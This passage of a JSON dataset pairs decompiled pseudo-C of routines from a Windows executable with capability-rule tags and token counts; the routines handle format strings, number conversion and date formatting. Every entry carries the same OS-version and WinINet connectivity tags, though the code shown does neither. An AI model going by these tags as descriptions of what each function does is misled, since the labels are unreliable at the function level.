            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint fcn.00407f8c(void)\n\n{\n    uint uVar1;\n    int32_t iStack20;\n    \n    uVar1 = fcn.00402c84();\n    if (iStack20 != 0) {\n        fcn.00407a8c();\n    }\n    return uVar1;\n}\n",
        "token_count": 71
    },
    "00407fc8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00407fc8(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00402c84();\n    if (param_1 != 0) {\n        uVar1 = param_2;\n    }\n    return CONCAT44(param_1, uVar1);\n}\n",
        "token_count": 79
    },
    "00407fe0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong __fastcall fcn.00407fe0(int32_t param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.00402c84();\n    *param_2 = uVar1;\n    return CONCAT44(param_1, uVar1 & 0xffffff00 | param_1 == 0);\n}\n",
        "token_count": 84
    },
    "00408890": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00408890(void)\n\n{\n    if (**0x4621c8 != NULL) {\n        (***0x4621c8)();\n        return;\n    }\n    fcn.00402818();\n    return;\n}\n",
        "token_count": 51
    },
    "004088c0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040898f)\n\nvoid __cdecl fcn.004088c0(uint noname_0, uint noname_1, int32_t arg_10h)\n\n{\n    char cVar1;\n    char cVar2;\n    char *in_EAX;\n    char *in_ECX;\n    char *pcVar3;\n    char *extraout_ECX;\n    char *extraout_ECX_00;\n    char *extraout_ECX_01;\n    char *pcVar4;\n    int32_t in_EDX;\n    char *extraout_EDX;\n    char *extraout_EDX_00;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint unaff_ESI;\n    char *pcVar8;\n    uint unaff_EDI;\n    bool bVar9;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar3 = in_ECX + arg_10h;\ncode_r0x004088e9:\n    pcVar4 = in_ECX;\n    if (in_EDX != 0) {\n        do {\n            if (pcVar4 == pcVar3) break;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar7 = pcVar5;\n            if (cVar1 == '%') {\n                if (pcVar5 == pcVar3) break;\n                pcVar7 = pcVar4 + 2;\n                cVar1 = *pcVar5;\n                if (cVar1 != '%') goto code_r0x00408913;\n            }\n            *in_EAX = cVar1;\n            in_EDX = in_EDX + -1;\n            pcVar4 = pcVar7;\n            in_EAX = in_EAX + 1;\n            if (in_EDX == 0) break;\n        } while( true );\n    }\ncode_r0x00408c27:\n    fcn.00408c17();\n    return;\ncode_r0x00408913:\n    in_ECX = pcVar7;\n    if (cVar1 == '-') {\n        if (pcVar7 == pcVar3) goto code_r0x00408c27;\n        in_ECX = pcVar7 + 1;\n    }\n    cVar2 = fcn.004089a2(unaff_EDI, unaff_ESI);\n    pcVar3 = extraout_ECX;\n    if (cVar2 != ':') goto code_r0x00408932;\n    if (in_ECX == extraout_ECX) goto code_r0x00408c27;\n    pcVar7 = in_ECX + 1;\n    cVar1 = *in_ECX;\n    goto code_r0x00408913;\ncode_r0x00408932:\n    pcVar5 = extraout_EDX;\n    if (cVar2 == '.') {\n        if (in_ECX == extraout_ECX) goto code_r0x00408c27;\n        in_ECX = in_ECX + 1;\n        fcn.004089a2(unaff_EDI, unaff_ESI);\n        pcVar3 = extraout_ECX_00;\n        pcVar5 = extraout_EDX_00;\n    }\n    fcn.004089ea(pcVar5, pcVar3);\n    pcVar7 = pcVar4 + -extraout_ECX_01;\n    if (pcVar4 < extraout_ECX_01) {\n        pcVar7 = NULL;\n    }\n    pcVar4 = extraout_ECX_01;\n    pcVar8 = in_ECX;\n    if (cVar1 == '-') {\n        bVar9 = pcVar5 < extraout_ECX_01;\n        pcVar5 = pcVar5 + -extraout_ECX_01;\n        if (bVar9) {\n            pcVar4 = extraout_ECX_01 + pcVar5;\n            pcVar5 = NULL;\n        }\n        for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n            *in_EAX = *pcVar8;\n            pcVar8 = pcVar8 + 1;\n            in_EAX = in_EAX + 1;\n        }\n    }\n    pcVar6 = pcVar5 + -pcVar7;\n    if (pcVar5 < pcVar7) {\n        pcVar7 = pcVar7 + pcVar6;\n        pcVar6 = NULL;\n    }\n    for (; pcVar7 != NULL; pcVar7 = pcVar7 + -1) {\n        *in_EAX = ' ';\n        in_EAX = in_EAX + 1;\n    }\n    in_EDX = pcVar6 - pcVar4;\n    if (pcVar6 < pcVar4) {\n        pcVar4 = pcVar4 + in_EDX;\n        in_EDX = 0;\n    }\n    for (; pcVar4 != NULL; pcVar4 = pcVar4 + -1) {\n        *in_EAX = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n        in_EAX = in_EAX + 1;\n    }\n    goto code_r0x004088e9;\n}\n",
        "token_count": 1182
    },
    "004089a2": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004089a2(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t in_AL;\n    uint8_t *in_ECX;\n    int32_t unaff_EBP;\n    uint8_t *unaff_ESI;\n    uint var_ch;\n    uint var_8h;\n    \n    if (in_AL == 0x2a) {\n        if (*(unaff_EBP + -0xc) <= *(unaff_EBP + 8)) {\n            *(unaff_EBP + -0xc) = *(unaff_EBP + -0xc) + 1;\n        }\n        if (unaff_ESI == in_ECX) {\ncode_r0x00408c27:\n            fcn.00408c17();\n            return;\n        }\n    }\n    else {\n        while ((0x2f < in_AL && (in_AL < 0x3a))) {\n            if (unaff_ESI == in_ECX) goto code_r0x00408c27;\n            in_AL = *unaff_ESI;\n            unaff_ESI = unaff_ESI + 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 251
    },
    "00408dd0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.00408dd0(uint arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    char in_CL;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uchar *puVar4;\n    uchar *puVar5;\n    uint var_2ch;\n    uint var_14h;\n    uint var_ch;\n    uint var_4h;\n    \n    iVar1 = 0x13;\n    if (in_CL == '\\0') {\n        iVar1 = arg_ch;\n        if (arg_ch < 2) {\n            iVar1 = 2;\n        }\n        if (0x12 < iVar1) {\n            iVar1 = 0x12;\n        }\n    }\n    uVar2 = 9999;\n    if (1 < arg_10h) {\n        uVar2 = arg_8h;\n    }\n    fcn.004090a4(uVar2, iVar1);\n    puVar5 = in_EAX;\n    if (var_2ch - 0x7fff < 2) {\n        fcn.00408ecf();\n        puVar4 = extraout_ECX * 3 + 0x408ec0;\n        for (iVar1 = 3; iVar1 != 0; iVar1 = iVar1 + -1) {\n            *puVar5 = *puVar4;\n            puVar4 = puVar4 + 1;\n            puVar5 = puVar5 + 1;\n        }\n    }\n    else {\n        uVar3 = arg_10h;\n        if ((arg_10h != 1) && ((4 < arg_10h || (iVar1 < var_2ch)))) {\n            uVar3 = 0;\n        }\n        (**(uVar3 * 4 + 0x408eac))();\n    }\n    return puVar5 - in_EAX;\n}\n",
        "token_count": 445
    },
    "00408ecf": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid fcn.00408ecf(void)\n\n{\n    int32_t unaff_EBP;\n    uchar *unaff_EDI;\n    uint var_2ah;\n    \n    if (*(unaff_EBP + -0x2a) != '\\0') {\n        *unaff_EDI = 0x2d;\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "004090a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004090a4(char param_1)\n\n{\n    uint unaff_EBX;\n    uint unaff_ESI;\n    uint var_4h;\n    \n    if (param_1 == '\\0') {\n        fcn.004090d1(unaff_EBX, unaff_ESI);\n    }\n    else {\n        fcn.004091f3(unaff_EBX);\n    }\n    return;\n}\n",
        "token_count": 92
    },
    "004090d1": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004090d1(uint arg_8h, uint arg_ch)\n\n{\n    char *pcVar1;\n    float10 fVar2;\n    int16_t *piVar3;\n    ushort uVar4;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint8_t uVar8;\n    int32_t iVar7;\n    ushort *unaff_EBX;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int16_t *piVar9;\n    float10 fVar10;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(unaff_ESI + 2);\n    uVar5 = uVar6 & 0x7fff;\n    if ((uVar6 & 0x7fff) == 0) {\ncode_r0x004090fc:\n        uVar6 = 0;\n    }\n    else {\n        if (uVar5 != 0x7fff) {\n            *(unaff_EBP + -8) = ((uVar5 - 0x3fff) * 0x4d10 >> 0x10) + 1;\n            fVar10 = fcn.00402d9c();\n            fVar10 = ROUND(fVar10);\n            fVar2 = *(*(unaff_EBP + -4) + 0x461168);\n            *(unaff_EBP + -10) = (fVar2 < fVar10) << 8 | (fVar2 == fVar10) << 0xe;\n            if ((*(unaff_EBP + -10) & 0x4100) != 0) {\n                fVar10 = fVar10 / *(*(unaff_EBP + -4) + 0x461174);\n                *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n            }\n            *(unaff_EBP + -0x18) = fVar10;\n            iVar7 = 9;\n            piVar9 = unaff_EBX + 3;\n            do {\n                uVar8 = *(iVar7 + -0x19 + unaff_EBP);\n                piVar3 = piVar9 + 1;\n                *piVar9 = (CONCAT11(uVar8, uVar8 >> 4) & 0xfff) + 0x3030;\n                iVar7 = iVar7 + -1;\n                piVar9 = piVar3;\n            } while (iVar7 != 0);\n            *piVar3 = 0;\n            uVar5 = *(unaff_EBP + -8) + *(unaff_EBP + 8);\n            if (uVar5 < 0) {\n                uVar5 = 0;\n                goto code_r0x004090fc;\n            }\n            if (*(unaff_EBP + 0xc) <= uVar5) {\n                uVar5 = *(unaff_EBP + 0xc);\n            }\n            if (uVar5 < 0x12) {\n                if (*(unaff_EBX + uVar5 + 3) < 0x35) goto code_r0x004091be;\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        *(unaff_EBX + 3) = 0x31;\n                        *(unaff_EBP + -8) = *(unaff_EBP + -8) + 1;\n                        break;\n                    }\n                    pcVar1 = unaff_EBX + uVar5 + 2;\n                    *pcVar1 = *pcVar1 + '\\x01';\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (0x39 < *(unaff_EBX + iVar7));\n            }\n            else {\n                uVar5 = 0x12;\ncode_r0x004091be:\n                do {\n                    *(unaff_EBX + uVar5 + 3) = 0;\n                    if (uVar5 - 1 < 0) {\n                        uVar8 = 0;\n                        goto code_r0x004091d1;\n                    }\n                    iVar7 = uVar5 + 2;\n                    uVar5 = uVar5 - 1;\n                } while (*(unaff_EBX + iVar7) == '0');\n            }\n            uVar8 = *(unaff_ESI + 2) >> 8;\ncode_r0x004091d1:\n            uVar4 = *(unaff_EBP + -8);\n            goto code_r0x004091d4;\n        }\n        if (((*(unaff_ESI + 6) & 0x8000) != 0) && ((*unaff_ESI != 0 || (unaff_ESI[1] != -0x80000000)))) {\n            uVar5 = 0x8000;\n            goto code_r0x004090fc;\n        }\n    }\n    uVar8 = uVar6 >> 8;\n    uVar4 = uVar5;\n    *(unaff_EBX + 3) = 0;\ncode_r0x004091d4:\n    *unaff_EBX = uVar4;\n    *(unaff_EBX + 1) = uVar8 >> 7;\n    return;\n}\n",
        "token_count": 1174
    },
    "004092d0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004092d0(uint param_1, float10 *param_2)\n\n{\n    uint8_t uVar1;\n    uint8_t uVar2;\n    uint8_t *in_EAX;\n    ushort extraout_var;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t extraout_EDX;\n    uint16_t in_FPUStatusWord;\n    uint16_t uVar5;\n    float10 fVar6;\n    uint16_t uVar7;\n    uint var_4h;\n    \n    uVar2 = *0x463687;\n    uVar5 = (in_FPUStatusWord >> 8 & 0x7f) << 8;\n    fcn.00409387();\n    uVar1 = *in_EAX;\n    uVar7 = uVar1;\n    if ((uVar1 == 0x2b) || (uVar1 == 0x2d)) {\n        in_EAX = in_EAX + 1;\n    }\n    fcn.00409392();\n    iVar4 = 0;\n    puVar3 = extraout_ECX;\n    if (*in_EAX == uVar2) {\n        in_EAX = in_EAX + 1;\n        fcn.00409392();\n        iVar4 = -extraout_EDX;\n        puVar3 = extraout_ECX_00;\n    }\n    if (puVar3 != in_EAX) {\n        if ((*in_EAX & 0xdf) == 0x45) {\n            in_EAX = in_EAX + 1;\n            fcn.004093ae(iVar4);\n        }\n        fcn.00409387();\n        if (*in_EAX == 0) {\n            fVar6 = fcn.00402d9c();\n            if (uVar7 >> 8 == '-') {\n                fVar6 = -fVar6;\n            }\n            if (uVar7 == '\\0') {\n                *param_2 = fVar6;\n            }\n            else {\n                *param_2 = ROUND(fVar6);\n            }\n            if ((uVar5 & 9) == 0) {\n                return CONCAT31(CONCAT22(extraout_var, uVar5) >> 8, 1);\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 527
    },
    "0040996c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040996c(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x13) == '\\0') {\n        fcn.00409834(*(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x13) = 1;\n    }\n    return;\n}\n",
        "token_count": 96
    },
    "004099a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004099a4(int32_t arg_8h)\n\n{\n    if (*(arg_8h + -0x1d) == '\\0') {\n        fcn.00409588(arg_8h + -0x1c, *(*(arg_8h + 8) + 8), *(*(arg_8h + 8) + 0xc));\n        *(arg_8h + -0x1d) = 1;\n    }\n    return;\n}\n",
        "token_count": 109
    },
    "00409c54": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00409c54(int32_t arg_8h)\n\n{\n    uint8_t uVar1;\n    bool bVar2;\n    uint8_t uVar3;\n    uint8_t *in_EAX;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint8_t uVar6;\n    uint8_t uVar7;\n    uint *in_FS_OFFSET;\n    uint uVar8;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_1dh;\n    int16_t var_18h;\n    uint16_t var_16h;\n    uint var_13h;\n    int32_t var_ch;\n    uint8_t *var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x40a3d5;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    if ((in_EAX != NULL) && (*(arg_8h + -0x108) < 2)) {\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + 1;\n        uVar7 = 0x20;\n        var_4h = in_EAX;\n        while (uVar1 = *var_4h,  uVar1 != 0) {\n            if ((*((uVar1 >> 3) + 0x46110c) >> (uVar1 & 7) & 1) == 0) {\n                var_4h = fcn.0040c11c();\n                uVar3 = uVar1;\n                if (uVar1 + 0x9f < 0x1a) {\n                    uVar3 = uVar1 - 0x20;\n                }\n                uVar6 = uVar7;\n                if (((uVar3 + 0xbf < 0x1a) && (uVar6 = uVar3,  uVar3 == 0x4d)) && (uVar7 == 0x48)) {\n                    uVar3 = 0x4e;\n                    uVar6 = uVar3;\n                }\n                uVar7 = uVar6;\n    // switch table (16 cases) at 0x409d70\n                switch(uVar3) {\n                case 0x22:\n                case 0x27:\n                    while( true ) {\n                        uVar3 = *var_4h;\n                        if ((uVar3 == 0) || (uVar3 == uVar1)) break;\n                        if ((*((uVar3 >> 3) + 0x46110c) >> (uVar3 & 7) & 1) == 0) {\n                            var_4h = var_4h + 1;\n                        }\n                        else {\n                            var_4h = fcn.0040c11c();\n                        }\n                    }\n                    fcn.00409890(arg_8h);\n                    if (*var_4h != 0) {\n                        var_4h = var_4h + 1;\n                    }\n                    break;\n                default:\n                    fcn.00409890(arg_8h);\n                    break;\n                case 0x2f:\n                    if (*0x463689 != '\\0') {\n                        fcn.00409890(arg_8h);\n                    }\n                    break;\n                case 0x3a:\n                    if (*0x463694 != '\\0') {\n                        fcn.00409890(arg_8h);\n                    }\n                    break;\n                case 0x41:\n                    fcn.004099a4(&stack0xfffffffc);\n                    iVar5 = fcn.0040871c();\n                    if (iVar5 == 0) {\n                        fcn.00409890(arg_8h);\n                        var_4h = var_4h + 4;\n                    }\n                    else {\n                        iVar5 = fcn.0040871c();\n                        if (iVar5 == 0) {\n                            fcn.00409890(arg_8h);\n                            var_4h = var_4h + 2;\n                        }\n                        else {\n                            iVar5 = fcn.0040871c();\n                            if (iVar5 == 0) {\n                                if (var_16h < 0xc) {\n                                    fcn.004098d4(arg_8h);\n                                }\n                                else {\n                                    fcn.004098d4(arg_8h);\n                                }\n                                var_4h = var_4h + 3;\n                            }\n                            else {\n                                iVar5 = fcn.0040871c();\n                                if (iVar5 == 0) {\n                                    fcn.0040996c(&stack0xfffffffc);\n                                    uVar8 = *(arg_8h + 8);\n                                    fcn.00409854(uVar8, *(arg_8h + 0xc));\n                                    fcn.004098d4(uVar8);\n                                    var_4h = var_4h + 3;\n                                }\n                                else {\n                                    iVar5 = fcn.0040871c();\n                                    if (iVar5 == 0) {\n                                        fcn.0040996c(&stack0xfffffffc);\n                                        uVar8 = *(arg_8h + 8);\n                                        fcn.00409854(uVar8, *(arg_8h + 0xc));\n                                        fcn.004098d4(uVar8);\n                                        var_4h = var_4h + 2;\n                                    }\n                                    else {\n                                        fcn.00409890(arg_8h);\n                                    }\n                                }\n                            }\n                        }\n                    }\n                    break;\n                case 0x43:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.00409c54(arg_8h);\n                    fcn.004099a4(&stack0xfffffffc);\n                    if (((var_16h != 0) || (var_18h != 0)) || (stack0xffffffe2 != 0)) {\n                        fcn.00409890(arg_8h);\n                        fcn.00409c54(arg_8h);\n                    }\n                    break;\n                case 0x44:\n                    fcn.00409940(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.0040996c(&stack0xfffffffc);\n                        fcn.004098f4(arg_8h);\n                    }\n                    else if (var_ch == 3) {\n                        uVar8 = *(arg_8h + 8);\n                        fcn.00409854(uVar8, *(arg_8h + 0xc));\n                        fcn.004098d4(uVar8);\n                    }\n                    else if (var_ch == 4) {\n                        uVar8 = *(arg_8h + 8);\n                        fcn.00409854(uVar8, *(arg_8h + 0xc));\n                        fcn.004098d4(uVar8);\n                    }\n                    else if (var_ch == 5) {\n                        fcn.00409c54(arg_8h);\n                    }\n                    else {\n                        fcn.00409c54(arg_8h);\n                    }\n                    break;\n                case 0x45:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.0040996c(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.00409b4c(&stack0xfffffffc);\n                    fcn.004098d4(iVar5);\n                    break;\n                case 0x47:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.0040996c(&stack0xfffffffc);\n                    iVar5 = arg_8h;\n                    fcn.004099e4(&stack0xfffffffc);\n                    fcn.004098d4(iVar5);\n                    break;\n                case 0x48:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.004099a4(&stack0xfffffffc);\n                    bVar2 = false;\n                    puVar4 = var_4h;\n                    while (uVar1 = *puVar4,  uVar1 != 0) {\n                        if ((*((uVar1 >> 3) + 0x46110c) >> (uVar1 & 7) & 1) == 0) {\n                            uVar1 = *puVar4;\n                            if (uVar1 < 0x49) {\n                                if (uVar1 == 0x48) break;\n                                if ((uVar1 == 0x22) || (uVar1 == 0x27)) {\n                                    bVar2 = bVar2 ^ 1;\n                                }\n                                else if (uVar1 == 0x41) goto code_r0x00409fc6;\n                            }\n                            else if (uVar1 == 0x61) {\ncode_r0x00409fc6:\n                                if (!bVar2) {\n                                    iVar5 = fcn.0040871c();\n                                    if ((iVar5 != 0) && (iVar5 = fcn.0040871c(),  iVar5 != 0)) {\n                                        fcn.0040871c();\n                                    }\n                                    break;\n                                }\n                            }\n                            else if (uVar1 == 0x68) break;\n                            puVar4 = puVar4 + 1;\n                        }\n                        else {\n                            puVar4 = fcn.0040c11c();\n                        }\n                    }\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.004098f4(arg_8h);\n                    break;\n                case 0x4d:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.0040996c(&stack0xfffffffc);\n                    if (var_ch - 1U < 2) {\n                        fcn.004098f4(arg_8h);\n                    }\n                    else if (var_ch - 1U == 2) {\n                        fcn.004098d4(arg_8h);\n                    }\n                    else {\n                        fcn.004098d4(arg_8h);\n                    }\n                    break;\n                case 0x4e:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.004099a4(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.004098f4(arg_8h);\n                    break;\n                case 0x53:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.004099a4(&stack0xfffffffc);\n                    if (2 < var_ch) {\n                        var_ch = 2;\n                    }\n                    fcn.004098f4(arg_8h);\n                    break;\n                case 0x54:\n                    fcn.00409940(&stack0xfffffffc);\n                    if (var_ch == 1) {\n                        fcn.00409c54(arg_8h);\n                    }\n                    else {\n                        fcn.00409c54(arg_8h);\n                    }\n                    break;\n                case 0x59:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.0040996c(&stack0xfffffffc);\n                    if (var_ch < 3) {\n                        fcn.004098f4(arg_8h);\n                    }\n                    else {\n                        fcn.004098f4(arg_8h);\n                    }\n                    break;\n                case 0x5a:\n                    fcn.00409940(&stack0xfffffffc);\n                    fcn.004099a4(&stack0xfffffffc);\n                    if (3 < var_ch) {\n                        var_ch = 3;\n                    }\n                    fcn.004098f4(arg_8h);\n                }\n            }\n            else {\n                iVar5 = arg_8h;\n                fcn.0040c0fc();\n                fcn.00409890(iVar5);\n                var_4h = fcn.0040c11c();\n                uVar7 = 0x20;\n            }\n        }\n        *(arg_8h + -0x108) = *(arg_8h + -0x108) + -1;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x40a3dc;\n    uStack60 = 0x40a3d4;\n    fcn.00403fcc();\n    return;\n}\n",
        "token_count": 2717
    },
    "0040a688": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nulong fcn.0040a688(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uStack20;\n    \n    uStack20 = 0;\n    iVar5 = 7;\n    piVar3 = 0x463750;\n    puVar4 = 0x46376c;\n    do {\n        if (*piVar3 == 0) break;\n        uVar1 = fcn.00404468();\n        fcn.00404468(uVar1);\n        iVar2 = fcn.0040c2d8();\n        if (iVar2 != 0) {\n            uStack20 = *puVar4;\n            break;\n        }\n        puVar4 = puVar4 + 1;\n        piVar3 = piVar3 + 1;\n        iVar5 = iVar5 + -1;\n    } while (iVar5 != 0);\n    return CONCAT44(uStack20, uStack20);\n}\n",
        "token_count": 227
    },
    "0040a6dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040a6dc(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    \n    if (*0x463744 == 0x12) {\n        if (in_EAX < 100) {\n            uVar1 = fcn.0040987c();\n            uVar2 = *(arg_8h + -4) >> 0x1f;\n            in_EAX = in_EAX + (((uVar1 & 0xffff) + ((*(arg_8h + -4) ^ uVar2) - uVar2)) / 100) * 100;\n        }\n        if (0 < *(arg_8h + -4)) {\n            *(arg_8h + -4) = -*(arg_8h + -4);\n        }\n    }\n    else {\n        *(arg_8h + -4) = *(arg_8h + -4) + -1;\n    }\n    return *(arg_8h + -4) + in_EAX;\n}\n",
        "token_count": 242
    },
    "0040a738": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0040a738(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    int32_t iStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_14h;\n    uint var_12h;\n    ushort var_eh;\n    ushort var_ch;\n    char var_ah;\n    uchar var_9h;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    var_20h = 0;\n    var_1ch = 0;\n    uStack64 = 0x40aa53;\n    iStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    var_12h._0_2_ = 0;\n    var_14h = 0;\n    var_18h._0_1_ = 0;\n    var_9h = 0;\n    var_ah = fcn.0040a5f4();\n    var_4h = 0;\n    if ((*0x46368c == NULL) || (**0x46368c != 'g')) {\n        iVar2 = fcn.0040c214();\n        if (0 < iVar2) {\n            var_4h = *0x46376c;\n        }\n    }\n    else {\n        fcn.0040a640();\n        fcn.004044c8(&fcn.0040a738::var_20h);\n        fcn.00407d50();\n        var_4h = fcn.0040a688();\n    }\n    cVar1 = 